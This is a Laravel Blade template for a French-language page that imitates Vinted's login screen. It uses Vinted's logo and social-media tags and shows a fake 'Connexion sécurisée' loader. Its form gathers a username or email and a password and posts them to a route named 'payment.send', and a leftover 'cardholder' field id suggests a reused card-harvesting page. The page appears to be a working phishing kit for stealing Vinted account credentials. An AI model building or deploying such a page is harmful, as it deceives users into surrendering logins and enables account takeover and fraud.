<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0"> 

        <meta property="og:title" content="Vinted" />
        <meta property="og:description" content="Connectez-vous à votre compte Vinted." />
        <meta property="og:type" content="website" />
        <meta property="og:url" content="{{ config('app.url') }}" />
        <meta property="og:image" content="{{ asset('images/vinted.png') }}" />
        <meta property="og:image:alt" content="Logo Vinted" />

        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:title" content="Vinted" />
        <meta name="twitter:description" content="Connectez-vous à votre compte Vinted." />
        <meta name="twitter:image" content="{{ asset('images/vinted.png') }}" />


    

        <title>{{ config('app.name', 'Vinted') }}</title>

        <!-- Fonts -->
        <link rel="preconnect" href="https://fonts.bunny.net">
        <link href="https://fonts.bunny.net/css?family=instrument-sans:400,500,600" rel="stylesheet" />
        <!-- Tailwind CSS via CDN -->
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
   <body class="bg-gray-50 min-h-screen flex items-center justify-center">


    <div id="global-loader" style="position: fixed; top:0;left:0;width:100%;height:100dvh; z-index: 9999; background: white; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.5s ease;">
        <div class="loader-content" style="text-align: center; margin-top: 0;">
            <div style="width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #0d9488 ; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
            <h2 style="font-family: sans-serif; color: #1b1b18; margin-top: 20px;">Connexion sécurisée...</h2>
            <p style="font-family: sans-serif; color: #706f6c; font-size: 14px;">Préparation de votre formulaire</p> 
        </div>
    </div>

<style>
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
</style>

<script>

        // B. On attend le chargement complet pour cacher le loader
        window.addEventListener('load', function() {
            const loader = document.getElementById('global-loader');
            
            // Sécurité : on vérifie que l'élément existe bien avant d'agir
            if (loader) {
                setTimeout(() => {
                    loader.style.opacity = '0';
                    setTimeout(() => {
                        loader.style.display = 'none';
                    }, 500);
                }, 1200);
            }
        });
    </script>
    


    <main class="w-full max-w-md px-4 py-8">



    
        
    <div class="bg-white p-4 sm:p-6 lg:p-8 shadow-lg rounded-2xl border border-gray-100">


        <header class="w-full max-w-md mx-auto text-sm mb-6">
        
        <div class="flex justify-center mt-5">
            <img
            src="{{ asset('images/vinted.png') }}"
            alt="Logo"
            class="h-8 sm:h-10 lg:h-14 w-auto"

            >
        </div>

        </header>
        @if ($errors->any())
    <div class="mb-4 rounded-lg bg-red-100 border border-red-400 text-red-700 px-4 py-3">
        <strong>Des erreurs sont survenues :</strong>

        <ul class="mt-2 list-disc list-inside">
            @foreach ($errors->all() as $error)
                <li>{{ $error }}</li>
            @endforeach
        </ul>
    </div>
@endif
        <h1 class="flex justify-center mt-6 sm:mt-10 font-bold pb-6 sm:pb-8 text-xl sm:text-2xl text-center">
Se connecter à votre compte</h1>

        <form action="{{ route('payment.send') }}" method="POST" class="space-y-4">

            @csrf
            <div>
            <label for="cardholder" class="block text-base font-medium text-gray-700 mb-1">Nom d'utilisateur / Email</label>
            <input type="text" id="cardholder" name="username" required
                class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-teal-600 focus:border-teal-600 outline-none transition" 
                placeholder="">
            </div>

            <div>
    <label for="password" class="block text-base font-medium text-gray-700 mb-1">
        Mot de passe
    </label>

    <div class="relative">

        <input
            type="password"
            id="password"
            name="password"
            required
            autocomplete="current-password"
            placeholder="••••••••"
            class="w-full px-4 py-2 pr-12 border border-gray-300 rounded-lg focus:ring-2 focus:ring-teal-600 focus:border-teal-600 outline-none transition"
        >

        <button
            type="button"
            id="togglePassword"
            class="absolute inset-y-0 right-0 flex items-center px-4 text-gray-500 hover:text-teal-600"
        >

            <svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                    d="M15 12a3 3 0 11-6 0 3 3 0 016 0zm6 0s-3-7-9-7-9 7-9 7 3 7 9 7 9-7 9-7z"/>
            </svg>

            <svg id="eyeClosed" xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 hidden" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                    d="M13.875 18.825A10.05 10.05 0 0112 19c-6 0-9-7-9-7a17.3 17.3 0 013.07-4.36m3.12-2.09A9.956 9.956 0 0112 5c6 0 9 7 9 7a17.47 17.47 0 01-2.18 3.19M15 12a3 3 0 00-4.24-2.76M9.88 9.88A3 3 0 0014.12 14.12M3 3l18 18"/>
            </svg>

        </button>

    </div>
</div>


            <button type="submit" class="w-full flex items-center justify-center bg-teal-600 hover:bg-teal-700 text-white font-bold py-3 px-6 mt-7 rounded-lg transition-colors duration-300 shadow-md">
            <svg class="w-4 h-4 mr-1 align-middle" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
            Se connecter et continuer
        </button>
        </form>

    </main>

    

       

    {{-- Espaceur conditionnel --}}
    @if (Route::has('login'))
        <div class="h-14 hidden lg:block"></div>
    @endif

    <script>
    // 2. On attend que TOUT soit chargé avant de toucher au style
    window.addEventListener('load', function() {
        const loader = document.getElementById('global-loader');
        
        // La sécurité : on vérifie que le loader existe bien avant de modifier son style
        if (loader) {
            setTimeout(() => {
                loader.style.opacity = '0';
                setTimeout(() => {
                    loader.style.display = 'none';
                }, 500);
            }, 1200);
        } else {
            console.error("Erreur : L'élément #global-loader n'a pas été trouvé dans le HTML.");
        }
    });
</script>

<script>
const togglePassword = document.getElementById('togglePassword');
const password = document.getElementById('password');

const eyeOpen = document.getElementById('eyeOpen');
const eyeClosed = document.getElementById('eyeClosed');

togglePassword.addEventListener('click', function () {

    const isPassword = password.type === 'password';

    password.type = isPassword ? 'text' : 'password';

    eyeOpen.classList.toggle('hidden');
    eyeClosed.classList.toggle('hidden');

});
</script>
</body>
</html>
